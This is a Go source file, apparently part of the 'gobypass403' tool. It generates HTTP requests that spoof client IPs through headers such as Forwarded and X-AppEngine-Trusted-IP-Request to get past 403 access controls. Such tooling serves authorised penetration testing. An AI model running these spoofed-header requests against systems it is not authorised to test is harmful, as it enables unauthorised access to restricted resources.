package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

/*
GenerateHeaderIPPayloads
*/
func (pg *PayloadGenerator) GenerateHeadersIPPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerNames, err := ReadPayloadsFromFile("header_ip_hosts.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read header names: %v", err)
		return allJobs
	}

	// Add custom headers (cli -spoof-header)
	if pg.spoofHeader != "" {
		customHeaders := strings.Split(pg.spoofHeader, ",")
		var normalizedCustomHeaders []string // Store normalized headers for logging
		for _, header := range customHeaders {
			header = strings.TrimSpace(header)
			if header != "" {
				normalizedHeader := NormalizeHeaderKey(header) // Apply normalization
				headerNames = append(headerNames, normalizedHeader)
				normalizedCustomHeaders = append(normalizedCustomHeaders, normalizedHeader)
			}
		}
		// Update logging to show normalized headers
		GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Added [%s] custom headers from -spoof-header\n", strings.Join(normalizedCustomHeaders, ","))
	}

	ips, err := ReadPayloadsFromFile("internal_ip_hosts.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read IPs: %v", err)
		return allJobs
	}

	// Add custom spoof IPs
	if pg.spoofIP != "" {
		customIPs := strings.Split(pg.spoofIP, ",")
		for _, ip := range customIPs {
			ip = strings.TrimSpace(ip)
			if ip != "" {
				ips = append(ips, ip)
			}
		}
		GB403Logger.Verbose().BypassModule(bypassModule).Msgf("Added [%s] custom IPs from -spoof-ip\n", strings.Join(customIPs, ","))
	}

	// Extract path and query
	rawURI := parsedURL.Path
	if parsedURL.Query != "" {
		rawURI += "?" + parsedURL.Query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		RawURI:       rawURI,
		BypassModule: bypassModule,
	}

	// Special case job
	specialJob := baseJob
	specialJob.Headers = []Headers{{
		Header: "X-AppEngine-Trusted-IP-Request",
		Value:  "1",
	}}
	specialJob.PayloadToken = GeneratePayloadToken(specialJob)
	allJobs = append(allJobs, specialJob)

	// Generate regular jobs
	for _, headerName := range headerNames {
		for _, ip := range ips {
			if headerName == "Forwarded" {
				variations := []string{
					fmt.Sprintf("by=%s", ip),
					fmt.Sprintf("for=%s", ip),
					fmt.Sprintf("host=%s", ip),
				}

				for _, variation := range variations {
					job := baseJob
					job.Headers = []Headers{{
						Header: headerName,
						Value:  variation,
					}}
					job.PayloadToken = GeneratePayloadToken(job)
					allJobs = append(allJobs, job)
				}
			} else {
				job := baseJob
				job.Headers = []Headers{{
					Header: headerName,
					Value:  ip,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)
			}
		}
	}

	GB403Logger.Debug().Msgf("[%s] Generated %d payloads for %s\n", bypassModule, len(allJobs), targetURL)
	return allJobs
}
